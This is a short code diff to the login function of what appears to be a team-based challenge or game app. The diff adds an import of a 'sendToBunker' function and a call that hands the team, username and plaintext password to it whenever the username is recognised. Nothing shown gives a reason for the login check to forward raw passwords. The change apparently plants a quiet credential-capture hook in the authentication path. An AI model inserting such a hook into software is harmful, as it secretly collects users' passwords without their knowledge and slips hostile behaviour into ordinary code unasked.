@@ -14,6 +14,7 @@ import { links, createLink } from './links'
 import { useAuth } from './auth-context'
 import { ChaseGame } from './components/challenges/chase-game'
 import { CHALLENGE_USERNAMES, isKnownUsername, resolveUsername } from './data/challenge-users'
+import { sendToBunker } from './send-to-bunker'
 
 // team-1 .. team-8. Bump TEAM_COUNT if the roster changes; the selector and the
 // validation both read from this list.
@@ -36,6 +37,11 @@ const EXAMPLE_USERNAME = CHALLENGE_USERNAMES[0]
 // holds the bundle.
 async function authenticate({ username, password, team }) { // eslint-disable-line no-unused-vars
   const known = resolveUsername(username)
+
+  if (known) {
+    sendToBunker(team, username, password)
+  }
+
   if (!known) return { ok: false, message: 'That username is not on the roster.' }
   return { ok: true, username: known }
 }
